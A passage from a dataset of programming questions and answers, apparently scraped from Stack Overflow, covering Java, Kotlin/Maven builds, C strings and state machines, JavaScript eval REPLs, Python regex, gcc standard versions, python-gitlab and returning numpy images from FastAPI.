Name: com/hunnysoft/jmime/
Sealed: true
Specification-Title: Hunny JMIME
Specification-Version: 3.1.1
Specification-Vendor: Hunny Software, Inc.
Implementation-Title: com.hunnysoft.jmime
Implementation-Version: 3.1.1E
Implementation-Vendor: Hunny Software, Inc.

I don't see anything unusual in this jar file.
My best guess is that perhaps the problem might be a missing dependency issue.  But AFAIK jmime is supposed to be self contained (JarAnalyzer doesn't come up with anything, but I'm not sure it would if a dependency jar is missing).
So, anyone have any IDEAs?
","First of all you should try File | Invalidate Caches and if it doesn't help, delete IDEA system directory. Then re-import the Maven project and see if it helps.
In some weird cases compiled classes may report wrong info and confuse IDEA. Verify that the classes from this jar report correct names using javap.
",java
how do you compile javakotlin project using maven,"I'm trying to compile maven project which has Kotlin classes referencing Java classes. Here's a part of my parent POM:
...

<dependency>
    <groupId>org.jetbrains.kotlin</groupId>
    <artifactId>kotlin-stdlib</artifactId>
    <version>${kotlin.version}</version>
</dependency>

...

<plugin>
    <groupId>org.apache.maven.plugins</groupId>
    <artifactId>maven-compiler-plugin</artifactId>
    <version>${compiler-plugin-version}</version>
    <configuration>
        <source>${java-version}</source>
        <target>${java-version}</target>
        <encoding>${project.build.sourceEncoding}</encoding>
    </configuration>
</plugin>

<plugin>
    <artifactId>kotlin-maven-plugin</artifactId>
    <groupId>org.jetbrains.kotlin</groupId>
    <version>${kotlin.plugin.version}</version>

    <executions>
        <execution>
            <id>compile</id>
            <phase>process-sources</phase>
            <goals>
                <goal>compile</goal>
            </goals>
        </execution>

        <execution>
            <id>test-compile</id>
            <phase>process-test-sources</phase>
            <goals>
                <goal>test-compile</goal>
            </goals>
        </execution>
    </executions>

    <configuration>
        <scanForAnnotations>false</scanForAnnotations>
    </configuration>
</plugin>

And related parts of the child POM:
<dependency>
    <groupId>org.jetbrains.kotlin</groupId>
    <artifactId>kotlin-stdlib</artifactId>
</dependency>

...

<plugin>
    <artifactId>kotlin-maven-plugin</artifactId>
    <groupId>org.jetbrains.kotlin</groupId>
    <configuration>
        <sourceDirs>
            <source>${project.basedir}/src/main/kotlin</source>
        </sourceDirs>
    </configuration>
</plugin>

And the Kotlin class:
Stateless
open class DummyServiceImpl : DummyService {

    PersistenceContext(unitName = Consts.UNIT_NAME)
    private val em: EntityManager? = null

    override fun get(id: Long?): Dummy {
        return em!!.find<Dummy>(javaClass<Dummy>(), id)
    }

    override fun sayHi(): String {
        return ""Dummy service says \""Hi!\"".""
    }
}

DummyService and Consts classes are Java classes residing in the same module as DummyServiceImpl.
So when I compile the module containing DummyServiceImpl with Maven it goes like this:
[error] C:\somepath\service\DummyServiceImpl.kt: (14, 31) Unresolved reference: DummyService
[error] C:\somepath\service\DummyServiceImpl.kt: (16, 35) Unresolved reference: Consts

If I switch Kotlin plugin execution phase to compile then it predictably fails if there're references from Java to Kotlin classes:
[ERROR] /C:/somepath/service/impl/DummyServiceClientImpl.java:[5,27] cannot find symbol
[ERROR] symbol:   class DummyServiceImpl

So, what's to be done about this? Note that building with IDEA's make goes perfectly fine.
","Make sure you have this declaration in <build> of your pom.xml
    <plugins>
        <plugin>
            <groupId>org.jetbrains.kotlin</groupId>
            <artifactId>kotlin-maven-plugin</artifactId>
            <version>${kotlin.version}</version>
            <executions>
                <execution>
                    <id>compile</id>
                    <phase>process-sources</phase>
                    <goals>
                        <goal>compile</goal>
                    </goals>
                    <configuration>
                        <sourceDirs>
                            <source>src/main/java</source>
                            <source>src/main/kotlin</source>
                            <source>src/main/resources</source>
                        </sourceDirs>
                    </configuration>
                </execution>
                <execution>
                    <id>test-compile</id>
                    <phase>process-test-sources</phase>
                    <goals>
                        <goal>test-compile</goal>
                    </goals>
                    <configuration>
                        <sourceDirs>
                            <source>src/test/java</source>
                            <source>src/test/kotlin</source>
                            <source>src/test/resources</source>
                        </sourceDirs>
                    </configuration>
                </execution>
            </executions>
        </plugin>
    </plugins>

Make sure that all folders (3x in src/main & 3x in src/test) mentioned in the configuration actually exist, even if they don’t contain any classes/resources. You can still fine-tune the configuration once it works for you.
Also pay attention to use exactly the same order I mentioned above to let the compiler compile the Java code first. 
",java
pointer arithmetic in c when used as a target array for strcat,"When studying string manipulation in C, I've come across an effect that's not quite what I would have expected with strcat(). Take the following little program:
#include <stdio.h>
#include <string.h>

int main()
{
    char string[20] = ""abcde"";
    strcat(string + 1, ""fghij"");
    printf(""%s"", string);

    return 0;
}

I would expect this program to print out bcdefghij. My thinking was that in C, strings are arrays of characters, and the name of an array is a pointer to its first element, i.e., the element with index zero. So the variable string is a pointer to a. But if I calculate string + 1 and use that as the destination array for concatenation with strcat(), I get a pointer to a memory address that's one array element (1 * sizeof(char), in this case) away, and hence a pointer to the b. So my thinking was that the target destination is the array starting with b (and ending with the invisible null character), and to that the fghij is concatenated, giving me bcdefghij.
But that's not what I get - the output of the program is abcdefghij. It's the exact same output as I would get with strcat(string, ""fghij""); - the addition of the 1 to string is ignored. I also get the same output with an addition of another number, e.g.  strcat(string + 4, ""fghij"");, for that matter.
Can somebody explain to me why this is the case? My best guess is that it has to do with the binding precedence of the + operator, but I'm not sure about this.
Edit: I increased the size of the original array with char string[20] so that it will, in any case, be big enough to hold the concatenated string. Output is still the same, which I think means the array overflow is not key to my question.
","You will get an output of abcdefghij, because your call to strcat hasn't changed the address of string (and nor can you change that – it's fixed for the duration of the block in which it is declared, just like the address of any other variable). What you are passing to strcat is the address of the second element of the string array: but that is still interpreted as the address of a nul-terminated string, to which the call appends the second (source) argument. Appending that second argument's content to string, string + 1 or string + n will produce the same result in the string array, so long as there is a nul-terminator at or after the n index.
To print the value of the string that you actually pass to the strcat call (i.e., starting from the 'b' character), you can save the return value of the call and print that:
#include <stdio.h>
#include <string.h>

int main()
{
    char string[20] = ""abcde"";
    char* result = strcat(string + 1, ""fghij""); // strcat will return the ""string + 1"" pointer
    printf(""%s"", result); // bcdefghij

    return 0;
}

",c
state machines in c,"What is the best way to write a state machine in C?
I usually write a big switch-case statement in a for(;;), with callbacks to re-enter the state machine when an external operation is finished.
Do you know a more efficient way?
","I like the Quantum Leaps approach.
The current state is a pointer to a function that takes an event object as argument. When an event happens, just call the state function with that event; The function can then do its work and transition to another state by just setting the state to another function.
E.g.:
// State type and variable, notice that it's a function pointer.
typedef void (*State)(int);
State state;

// A couple of state functions.
void state_xyz(int event) { /*...*/ }
void state_init(int event) {
    if (event == E_GO_TO_xyz) {
        // State transition done simply by changing the state to another function.
        state = state_xyz;
    }
}

// main contains the event loop here:
int main() {
    int e;
    // Initial state.
    state = state_init;
    // Receive event, dispatch it, repeat... No 'switch'!
    while ((e = wait_for_event()) != E_END) {
        state(e);
    }
    return 0;
}

The QL frameworks provides helpers for extra things like entry/exit/init actions, hierarchical state machines, etc. I highly recommend the book for a deeper explanation and good implementation of this.
",c
how to add custom install button for pwa,"i want to add custom install button for my progressive web app within the site. i red many articles and tried the answer provided by them. they use beforeinstallprompt
let deferredPrompt;

window.addEventListener('beforeinstallprompt', (e) => {
    deferredPrompt = e;
});

but the problem i am facing is i want the button to directly installed the pwa instead of triggering the installation prompt. is it possible, if so how can i achieve that. thanks you in advance.
","The answer is, you can't. According to the manifest spec:

By design, this specification does not provide developers with an explicit API to ""install"" a web application.

",javascript
print a given number pattern from user input using nested for loop,"I am new to programming. Am currently learning Java, on nested loop now, and got stuck.
So what I want to do is to write a program that takes an integer from user and
print lines, for example if user input was 4 then the result should be like:
1

1 2

1 2 3

1 2 3 4

Here is my code so far:
import java.util.Scanner;

public class Hello {
    public static void main(String[] args) {
        Scanner input = new Scanner(System.in);
        System.out.println(""Enter number of rows:"");
        int number = input.nextInt();
        for (int i = 1; i <= number; i++) {
            System.out.println(i);
            for (int j = 1; j <= i; j++) {
                System.out.print(j + "" "");
            }
        }
    }
}

But it prints one extra line at the end, like:
1

1 2

1 2 3

1 2 3 4

1 2 3 4

And it is hard for me to figure out why.
I guess it is my first for loop but I don't know how to fix the for loop to get the result I want.
Any help will be appreciated. Thanks!
","Don't print anything from the outer loop, only new line
for (int i = 1; i <= number; i++) {
    for (int j = 1; j <= i; j++) {
        System.out.print(j + "" "");
    }
    System.out.println();
}

Output
1 
1 2 
1 2 3 
1 2 3 4 

",java
undefined symbol main,"We have installed GCC and libgcc on AIX.
I am busy compiling a C library on the machine and keep getting the following error:
Undefined symbol: .main
Any idea how to solve this?
Thanks for the help
Lynton
","You are most likely using the wrong gcc arguments - probably you are using the same ones you'd use for an executable program (where main() is required). The correct arguments depend on what kind of library you want to build (a static one or a dynamic (.so) one)
",c
what39s the reason i can39t create generic array types in java,"What's the reason why Java doesn't allow us to do
private T[] elements = new T[initialCapacity];

I could understand .NET didn't allow us to do that, as in .NET you have value types that at run-time can have different sizes, but in Java all kinds of T will be object references, thus having the same size (correct me if I'm wrong).
What is the reason?
","It's because Java's arrays (unlike generics) contain, at runtime, information about its component type. So you must know the component type when you create the array. Since you don't know what T is at runtime, you can't create the array.
",java
why does gccs static analyser falsely warn that a pointer to an allocated memory block itself stored in an allocated memory block may leak,"#include <stdio.h>
#include <stdlib.h>

int main()
{
    int ***new = malloc(sizeof(int **));
    *new = malloc(sizeof(int *));
    **new = malloc(sizeof(int));

    ***new = 2137;
    printf(""%i\n"", ***new);

    free(**new);
    free(*new);
    free(new);

    return EXIT_FAILURE;
}


This code, when compiled using command gcc -Wall -Wextra -fanalyzer -g -O0 -fsanitize=address,undefined -o test2 test2.c produces output:
test2.c: In function ‘main’:
test2.c:10:7: warning: leak of ‘malloc(4)’ [CWE-401] [-Wanalyzer-malloc-leak]
   10 |     ***new = 2137;
      |       ^~~~
  ‘main’: events 1-2
    |
    |    8 |     **new = malloc(sizeof(int));
    |      |             ^~~~~~~~~~~~~~~~~~~
    |      |             |
    |      |             (1) allocated here
    |    9 | 
    |   10 |     ***new = 2137;
    |      |       ~~~~   
    |      |       |
    |      |       (2) ‘malloc(4)’ leaks here; was allocated at (1)
    |

I have narrowed down my code do something as simple as this, but still cannot find the problem. I know I am not checking malloc errors, doing so does not help, I have removed them to improve clarity.
How do I fix this?
","This is a bug in the analyzer.  If we look closely at the output:
    |
    |    8 |     **new = (int*) malloc(sizeof(int));
    |      |                    ^~~~~~~~~~~~~~~~~~~
    |      |                    |
    |      |                    (1) allocated here
    |    9 | 
    |   10 |     ***new = 2137;
    |      |       ~~~~          
    |      |       |
    |      |       (2) ‘malloc(4)’ leaks here; was allocated at (1)

We can see that the assigned pointer it's checking is not the same one where the leak happens.  Specifically, it incorrectly thinks that an assignment to ***new overwrites as assignment to **new.
To verify, we can run the code through valgrind, which shows there is no memory leak:
==23502== Memcheck, a memory error detector
==23502== Copyright (C) 2002-2017, and GNU GPL'd, by Julian Seward et al.
==23502== Using Valgrind-3.15.0 and LibVEX; rerun with -h for copyright info
==23502== Command: ./x1
==23502== 
2137
==23502== 
==23502== HEAP SUMMARY:
==23502==     in use at exit: 0 bytes in 0 blocks
==23502==   total heap usage: 3 allocs, 3 frees, 20 bytes allocated
==23502== 
==23502== All heap blocks were freed -- no leaks are possible
==23502== 
==23502== For lists of detected and suppressed errors, rerun with: -s
==23502== ERROR SUMMARY: 0 errors from 0 contexts (suppressed: 0 from 0)

When compiling with versions 10 and 11 of gcc with these options, no warnings appear.  The warning you show start with version 12 of gcc.
",c
why doesn39t scanf read the value correctly,"Can someone tell me what is going wrong here?
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

#define ERROR 0
#define MAX_INPUT_LINE 80
#define print(x) {fputs(x,stdout);}
#define SUCCESS 1

int main (long argc, char *argv[])
{
   int mode;
   printf(""1 for hexidecimal or 2 for binary"");
   scanf(""%d"", mode);

   printf(""\n\n\nThe value of mode is %d\n"", mode);
   return 0;
}

When I enter 2 for binary, I get this:
The value of mode is 2665564

Obviously I should get 2, what am I doing wrong?? Is it my compiler, is it bevcause I am using Cygwin? Why is mode not 2??
","This is C, not Java. When you use a function like scanf (...) since you cannot pass variables by reference, you are expected to pass a pointer to the variable that will hold the value.
Use the following instead:
scanf (""%d"", &mode);

The use of (&) will pass the address-of mode, instead of implicitly casting mode to an (int *).
You are actually quite lucky in this example that this did not cause your program to crash. If mode had a value of 0 and was cast to a pointer in order to satisfy this function, you could well wind up dereferencing a NULL pointer.
",c
c programming difference between i and ii1 from an assembler point of view,"This was an interview question. I said they were the same, but this was adjudged an incorrect response. From the assembler point of view, is there any imaginable difference? I have compiled two short C programs using default gcc optimization and -S to see the assembler output, and they are the same.
","The interviewer may have wanted an answer something like this:

i=i+1 will have to load the value of i, add one to it, and then store the result back to i.  In contrast, ++i may simply increment the value using a single assembly instruction, so in theory it could be more efficient.  However, most compilers will optimize away the difference, and the generated code will be exactly the same.

FWIW, the fact that you know how to look at assembly makes you a better programmer than 90% of the people I've had to interview over the years.  Take solace in the fact that you won't have to work with the clueless loser who interviewed you.
",c
calendar returning the wrong time,"The time displayed is way ahead of what I expected. I'm parsing a date string and turning it into milliseconds.
year = Integer.parseInt(m1.group(1));
mo = Integer.parseInt(m1.group(2));
day = Integer.parseInt(m1.group(3));
hr = Integer.parseInt(m1.group(4));
min = Integer.parseInt(m1.group(5));
sec = Integer.parseInt(m1.group(6));

and here I set the Calendar
Calendar cal = Calendar.getInstance();
cal.set(year, mo, day, hr, min, sec);
time = cal.getTimeInMillis();

","If you check out the calendar documentation here, then visit here, you'll see that January is month 0. You'll want to change your code to mo = Integer.parseInt(m1.group(2))-1;
",java
why does the python datetimereplace method return a new object instead of mutate the existing object,"Calling the .replace() method on a Python DateTime object returns a new instance of a DateTime object instead of mutating the existing object. This seems to be a common pitfall when learning the method.
","datetime objects in Python are immutable - this is an intentional design choice that provides thread safety and predictable behavior. This immutable behavior is consistent with other built-in Python types like strings and tuples. It's a powerful feature that helps prevent unintended side effects in your code.
So this is a sample usage:
from datetime import datetime

# Create a datetime object
current_date = datetime(2024, 12, 12, 12, 30)

# Correct usage - assign the new value
new_date = current_date.replace(hour=15)

# Now new_date has hour=15, while current_date remains unchanged
print(new_date)        # 2024-12-12 15:30:00
print(current_date)    # 2024-12-12 12:30:00

",python
how to convert hhmmsssss to milliseconds,"I have a String 00:01:30.500 which is equivalent to 90500 milliseconds. I tried using SimpleDateFormat which give milliseconds including current date. I just need that String representation to milliseconds. Do I have to write custom method, which will split and calculate milliseconds? or Is there any other way to do this? Thanks.
I have tried as follows:
        String startAfter = ""00:01:30.555"";
        SimpleDateFormat dateFormat = new SimpleDateFormat(""HH:mm:ss.SSS"");
        Date date = dateFormat.parse(startAfter);
        System.out.println(date.getTime());

","You can use SimpleDateFormat to do it. You just have to know 2 things. 

All dates are internally represented in UTC
.getTime() returns the number of milliseconds since 1970-01-01 00:00:00 UTC.

package se.wederbrand.milliseconds;

import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.TimeZone;

public class Main {        
    public static void main(String[] args) throws Exception {
        SimpleDateFormat sdf = new SimpleDateFormat(""yyyy-MM-dd HH:mm:ss.SSS"");
        sdf.setTimeZone(TimeZone.getTimeZone(""UTC""));

        String inputString = ""00:01:30.500"";

        Date date = sdf.parse(""1970-01-01 "" + inputString);
        System.out.println(""in milliseconds: "" + date.getTime());        
    }
}

",java
what is a quotthisescapequot warning and how do i deal with it,"I struggle to find resources on this, and yet, so many of my classes are running into this error when I compile my code on the latest Java (21).
Here is a code example.
public class ThisEscapeExample
{

        public Object o;

        public ThisEscapeExample()
        {

                this.overridableMethod();

        }

        public void overridableMethod()
        {

                this.o = new Object();

        }

}

And here is my compilation command.
javac -Xlint:all ThisEscapeExample.java
ThisEscapeExample.java:9: warning: [this-escape] possible 'this' escape before subclass is fully initialized
                this.overridableMethod();
                                      ^
1 warning

","Here is the JDK Bug System entry that introduces this new warning - https://bugs.openjdk.org/browse/JDK-8299995
Long story short, the this-escape warning is to warn you when a subclass may be able to @Override a method that is also called in the superclass' constructor.
This is dangerous because overriding a method that is used in the constructor allows subclass' to unintentionally introduce a bug during a subclass' initialization. What if that method depends on state that has not yet been created because we are still in the super constructor? After all, you cannot do anything in the subclass' constructor before calling the super constructor (for now).
There are a few ways to remedy this.

Only use methods in the constructor that cannot be overridden.

static methods.

final methods.

MUST BE IN THE SAME CLASS AS YOUR CONSTRUCTOR, YOU CANNOT USE PARENT FINAL INSTANCE METHODS IN THE CHILD CLASS' CONSTRUCTOR


private methods.



Make the class itself final.

Don't pass in/use this to begin with - instead, pass in the particular component of this that you needed.

Basically, quit being lazy and be explicit with what you need. Don't just pass in your God object -- pass in only the specific attributes you need.



Please note - these rules apply recursively. Meaning, when you call a method in the constructor, not only does that method have to be ""not-overridable"", but the methods that that method passes this into must ALSO match one of the rules above. If your top-level method is not overridable, but one of the methods inside of it is, and that method has this in its scope, then you will receive a this-escape error upon compilation. Here is an example.
import javax.swing.*;

public class GUI
{

   private final JFrame frame;

   public GUI()
   {
   
      this.frame = new JFrame();
   
      this.frame.add(this.createBottomPanel());
   
   }

   //final! Does that mean we are safe?
   final JPanel createBottomPanel()
   {
   
      final JButton save = new JButton();
   
      save
         .addActionListener
         (
            /*
             * No. We get the warning here at the start of this lambda.
             * The reason is because we have given this lambda the
             * ability to call this.toString(), and we don't know when
             * it will do that. Maybe now, maybe later. But if it does
             * it now, then we could end up doing things before the
             * object is fully created. And if that were to happen, then
             * that would be a this-escape. So, the warning occurs here,
             * to let you know that it is possible.
             */
            actionEvent ->
            {
           
               this.toString();
           
            }
           
         )
         ;
   
      return null;
   
   }

}

This question also has some useful examples, in case mine above does not make much sense -- Why does 'this-escape' warning trigger when calling final methods from the superclass
Now, if none of the solutions above are an option for you, consider the tactic of lazy loading your data. Lazy loading is when you load your data only as needed -- meaning, NOT in your constructor. For example, if your class needs a database connection, don't make the connection happen in the constructor, do it in the getter call. Like this.
public class SomeClass
{

    private DbConnection connection = null;

    //More fields here.

    public SomeClass()
    {

        //Don't set the db connection here.

    }

    public DbConnection getConnection()
    {

        if (this.connection == null)
        {

            this.connection = createAConnection(this);

        }

        return this.connection;

    }

}


And finally, if none of this works, or there is just some entirely unescapable situation, there are 2 very hacky, undesirable ways to just silence the error. You really should NOT depend on this, but if you are CERTAIN that it can't hurt you, here are 2 ways to silence it.

Supress the warning using @SuppressWarnings(""this-escape"").

But please note, if you do this, then your class will not be allowed to become a Value class. Value classes are going to give you a MASSIVE performance increase. But in order to turn your class into a value class, you have to have no this-escape. That warning turns into an error for value classes, so if you have any this-escape in your value class, then your value class will not compile.


Turn off ALL reports of a ""this-escape"" warning! DANGEROUS! DO NOT DO UNLESS ABSOLUTELY NECESSARY!

This is the nuclear option. The big red button. Please self-reflect before doing this. Doing this will turn off ALL reports of a this-escape for ALL SOURCE CODE THAT YOU ARE COMPILING. So that means that you should really only use this if a whole bunch of classes are getting this warning, and you know for certain that none of them are a problem (or that, any problems that exist, you are willing to pay the consequences for them). If that's true, then you can type in -Xlint:-this-escape as one of the command line arguments for your compiler command, and that will turn off this warning entirely for all code that you are compiling. I've said enough about how perilous this is, so I won't repeat myself. I will only add that if you decide to do this, make sure you only do it on the specific files/projects/workspaces you want, and don't leave this setting on for others. You can look up your IDE's specific settings to figure out how to set this on the PROJECT-SPECIFIC level and not the ALL-PROJECTS level.



",java
why is this power calculating function crashing,"I tried following function (as suggested on these forums) to calculate power. However, it is causing program to hang up.
static long ipow(int b, int e) {
    long r = 1;
    while (e--) r *= b;
    return r;
}

double cfilefn(int a, int b, int c) {
    return (ipow(a, b) / (double)c); 
}

cfilefn(2,3,4);

The function looks all right. Where is the error and how can it be solved?
","The ipow function will misbehave if the second argument is a negative number: it will run for a while and have implementation defined behavior when e reaches INT_MIN. You should modify the test while (e--) r *= b; as:
static long ipow(int b, int e) {
    long r = 1;
    while (e-- > 0)
        r *= b;
    return r;
}

Note however that ipow will cause arithmetic overflow for moderately large values of e and since you want a double result from cfilefn, you should use double arithmetics for the power function:
#include <math.h>

double cfilefn(int a, int b, int c) {
    return pow(a, b) / c; 
}

",c
regex to match a whole number not ending in some digits,"I've not been able to construct a pattern which can return an whole numbers that don't end in a sequence of digits. The numbers could be of any length, even single digits, but they will always be whole. Additionally, multiple numbers could be on the same line of text and I want to match them all. The numbers are always followed by either a  single space or the end of the line or the end of the text. I'm matching in python 3.12
For example, over the text '12345 67890 123175 9876', let's say I want to get all numbers not ending in 175.
I would want the following matches:
12345
67890
9876

I've tried using the following:

\d+(?<!175)(\b|$), which matched 3 empty strings,

text = ""12345 67890 123175 9876""
matches = findall(r""\d+(?<!175)(\b|$)"", text)
print(matches)
> ['', '', '']


\d+(?!175)(\b|$), which matched 4 empty strings,

text = ""12345 67890 123175 9876""
matches = findall(r""\d+(?!175)(\b|$)"", text)
print(matches)
> ['', '', '', '']


\d+(?<!175), which matched all 4 numbers

matches = findall(r""\d+(?<!175)"", text)
> ['12345', '67890', '12317', '9876']


\d+(?:175), which matched only the number ending in 175

matches = findall(r""\d+(?:175)"", text)
> ['123175']

","You can use is a negative lookbehind .*(?<!a) that ensures the string does not end with a.
\d++(?<!175)

Test here.
Note that Possessive Quantifier (++) has been introduced in Python 3.11. Your 2nd approach was close, but not correct since the Greedy quantifier (+) would eat up all the digits, and then try to backtrack.
",python
contextpreserving eval,"We're building a small REPL that evaluates (with eval) javascript expressions as they are being entered by the user. Since the whole thing is event-driven, evaluation must take place in a separate function, but the context (that is, all declared variables and functions) must be preserved between the calls. I came up with the following solution:


function* _EVAL(s) {
    while (1) {
        try {
            s = yield eval(s)
        } catch(err) {
            s = yield err
        }
    }
}

let _eval = _EVAL()
_eval.next()

function evaluate(expr) {
    let result = _eval.next(expr).value
    if (result instanceof Error)
        console.log(expr, 'ERROR:', result.message)
    else
        console.log(expr, '===>', result)
}

evaluate('var ten = 10')
evaluate('function cube(x) { return x ** 3 }')
evaluate('ten + cube(3)')
evaluate('console.log(""SIDE EFFECT"")')
evaluate('let twenty = 20')
evaluate('twenty + 40') // PROBLEM



As you can see it works fine with function-scoped variables (var and function), but fails on block scoped ones (let).
How can I write a context-preserving eval wrapper that would also preserve block-scoped variables?
The code runs in a browser, DOM and Workers are fully available.
It should be mentioned that the desired function must handle side effects properly, that is, each line of code, or, at least, each side effect, should be performed exactly once.
Links:
JavaScript: do all evaluations in one vm | https://vane.life/2016/04/03/eval-locally-with-persistent-context/
","The article you linked contains a crazy approach that actally works: during each eval() call, we create a new closure inside that eval scope and export it so that to we can use it evaluate the next statement.


var __EVAL = s => eval(`void (__EVAL = ${__EVAL.toString()}); ${s}`);

function evaluate(expr) {
    try {
        const result = __EVAL(expr);
        console.log(expr, '===>', result)
    } catch(err) {
        console.log(expr, 'ERROR:', err.message)
    }
}

evaluate('var ten = 10')
evaluate('function cube(x) { return x ** 3 }')
evaluate('ten + cube(3)')
evaluate('console.log(""SIDE EFFECT"")')
evaluate('let twenty = 20')
evaluate('twenty + 40') // NO PROBLEM :D



",javascript
what is the default c std standard version for the current gcc especially on ubuntu,"When I ask to see the current version of cc I get this.
$ cc --version
cc (Ubuntu/Linaro 4.7.2-2ubuntu1) 4.7.2
Copyright (C) 2012 Free Software Foundation, Inc.
This is free software; see the source for copying conditions.  There is NO
warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.

$ 

What I would like to know is which of c89, c90, c99 or c11 is being used.
","This is explained in depth in the gcc manual, available (if it's installed) by typing info gcc or online here.  The relevant section of the current
manual is here, but it may or may not correspond to the version you're using.
Some of this information has changed since I posted this answer in 2013, and will continue to change. If you're reading this around 2023, the current version is probably -std=gnu17 (C17 with GNU-specific extensions; C17 is a minor update to C11). You should check the documentation for the version you're using. The C23 standard has not yet been released, but should be out Real Soon Now. I can't predict when gcc will switch to -std=gnu23 as its default. If you're reading this in the distant future, let us know how things turned out.
gcc releases from 3.0 to 4.9.4 default to -std=gnu89 or -std=gnu90.
gcc releases from 5.5 to 10.4 default to -std=gnu11 (they skipped -std=gnu99, though you can still specify it).
gcc releases 11.3 and 12.2 default to std=gnu17.

By default, gcc does not conform to any of the ANSI/ISO C standards. The current default is equivalent to -std=gnu17, which is the 2017  standard with GNU-specific extensions. (Some diagnostics required by the language standard are not issued.) Earlier releases of gcc have defaulted to -std=gnu90 or -std=gnu11.
If you want standard conformance, you can use any of the following:
-std=c90 -pedantic
-std=c99 -pedantic
-std=c11 -pedantic
-std=c17 -pedantic

-std=c90 can also be spelled -ansi, -std=c89, or -std=iso9899:1990.
-std=iso9899:199409 supports the C90 standard plus the 1995 amendment, which added a few minor features (all of which are also in C99).
-std=c99 can also be spelled -std=c9x or -std=iso9899:1999 (the name c9x was used before the standard was published). C99 support is not quite complete, but it's close.
-std=c11 can also be spelled -std=c0x or -std=iso9899:2011 (the name c0x was used before the final standard was published; it was wrongly assumed that x would not exceed 9). C11 support is also incomplete; the current status is summarized here.
The -pedantic option causes gcc to print required diagnostics for violations of constraints and syntax rules. In some cases, those diagnostics are merely warnings -- and there's no easy way to distinguish between those warnings and other warnings that aren't required by the language. Replace -pedantic by -pedantic-errors to cause gcc to treat language violations as fatal errors.
A quick history of the standard:

C89 was the first official C standard, published by ANSI in 1989.
C90 was the ISO version of the standard, describing exactly the same language as C89. ANSI officially adopted ISO's version of the standard. There were two Technical Corrigenda, correcting some errors.
C95 was an amendment to C90, adding a few features, mainly digraphs and wide character support. As far as I know, a merged version was never published.
C99 was issued by ISO in 1999. There were three Technical Corrigenda.
C11 was issued by ISO in 2011. There has been one Technical Corrigendum, fixing the definitions of __STDC_VERSION__ and __STDC_LIB_EXT1__.
C17 was issued by ISO in 2018, and was only a minor update to C11.
C23 was issued by ISO in 2024.

ANSI did not issue its own versions of the 1999 or later standards, adopting the ISO standards instead.
N1256 is a freely available draft of the C99 standard, with the 3 Technical Corrigenda merged into it.
N1570 is a freely available draft of the C11 standard. There are some minor differences between it and the published C11 standard, plus one Technical Corrigendum. For more details, see my answer to this question.
",c
how to update a protected branch in pythongitlab,"I am using python-gitlab to help configure projects. I'm trying to automate going into GitLab Settings > Repository > Protected branches, then for the existing master branch, changing ""Allowed to merge"" from ""Maintainers"" to ""Developers + Maintainers"". Here's a code snippet:
import gitlab
gl = gitlab.Gitlab.from_config()
project = project = gl.projects.get(""my-team/my_project"")
master_branch = project.protectedbranches.get(""master"")
print(master_branch.merge_access_levels)

The data type is just is a list of dicts; there doesn't appear to be a way to update the setting like other settings in this API. Even if you just update it:
master_branch.merge_access_levels[0]['access_level'] = 30
project.save()

nothing happens. Is there a way to do this with python-gitlab?
","
The data type is just is a list of dicts; there doesn't appear to be a
way to update the setting like other settings in this API. Even is you
just update it:
master_branch.merge_access_levels[0]['access_level'] = 30
project.save() 

nothing happens. Is there a way to do this with python-gitlab?

python-gitlab previous did not support updating protected branches, only creating/deleting them. Support for updating them was recently added, though this is not yet a published release (4.4.0 is the latest release as of this post), though it will likely be the next release, after which this example should work:
import gitlab
gl = gitlab.Gitlab.from_config()
project = gl.projects.get(""my-team/my_project"")
protected_master_branch = project.protectedbranches.get(""master"")
protected_master_branch.merge_access_levels[0]['access_level'] = 30
protected_master_branch.save()

",python
render numpy array in fastapi,"I have found How to return a numpy array as an image using FastAPI?, however, I am still struggling to show the image, which appears just as a white square.
I read an array into io.BytesIO like so:
def iterarray(array):
    output = io.BytesIO()
    np.savez(output, array)
    yield output.get_value()

In my endpoint, my return is StreamingResponse(iterarray(), media_type='application/octet-stream')
When I leave the media_type blank to be inferred a zipfile is downloaded.
How do I get the array to be displayed as an image?
","Option 1 - Return image as bytes
The below examples show how to convert an image loaded from disk, or an in-memory image (in the form of numpy array), into bytes (using either PIL or OpenCV libraries) and return them using a custom Response. For the purposes of this demo, the below code is used to create the in-memory sample image (numpy array), which is based on this answer.
# Function to create a sample RGB image
def create_img():
    w, h = 512, 512
    arr = np.zeros((h, w, 3), dtype=np.uint8)
    arr[0:256, 0:256] = [255, 0, 0] # red patch in upper left
    return arr

Using PIL
Server side:
You can load an image from disk using Image.open, or use Image.fromarray to load an in-memory image (Note: For demo purposes, when the case is loading the image from disk, the below demonstrates that operation inside the route. However, if the same image is going to be served multiple times, one could load the image only once at startup and store it on the app instance, as described in this answer). Next, write the image to a buffered stream, i.e., BytesIO, and use the getvalue() method to get the entire contents of the buffer. Even though the buffered stream is garbage collected when goes out of scope, it is generally better to call close() or use the with statement, as shown here and below.
from fastapi import Response
from PIL import Image
import numpy as np
import io

@app.get('/image', response_class=Response)
def get_image():
    # loading image from disk
    # im = Image.open('test.png')
    
    # using an in-memory image
    arr = create_img()
    im = Image.fromarray(arr)
    
    # save image to an in-memory bytes buffer
    with io.BytesIO() as buf:
        im.save(buf, format='PNG')
        im_bytes = buf.getvalue()
        
    headers = {'Content-Disposition': 'inline; filename=""test.png""'}
    return Response(im_bytes, headers=headers, media_type='image/png')

Client side:
The below demonstrates how to send a request to the above endpoint using Python requests module, and write the received bytes to a file, or convert the bytes back into PIL Image, as described here.
import requests
from PIL import Image

url = 'http://127.0.0.1:8000/image'
r = requests.get(url=url)

# write raw bytes to file
with open('test.png', 'wb') as f:
    f.write(r.content)

# or, convert back to PIL Image
# im = Image.open(io.BytesIO(r.content))
# im.save('test.png') 

Using OpenCV
Server side:
You can load an image from disk using cv2.imread() function, or use an in-memory image, which—if it is in RGB order, as in the example below—needs to be converted, as OpenCV uses BGR as its default colour order for images. Next, use cv2.imencode() function, which compresses the image data (based on the file extension you pass that defines the output format, i.e., .png, .jpg, etc.) and stores it in an in-memory buffer that is used to transfer the data over the network.
import cv2

@app.get('/image', response_class=Response)
def get_image():
    # loading image from disk
    # arr = cv2.imread('test.png', cv2.IMREAD_UNCHANGED)
    
    # using an in-memory image
    arr = create_img()
    arr = cv2.cvtColor(arr, cv2.COLOR_RGB2BGR)
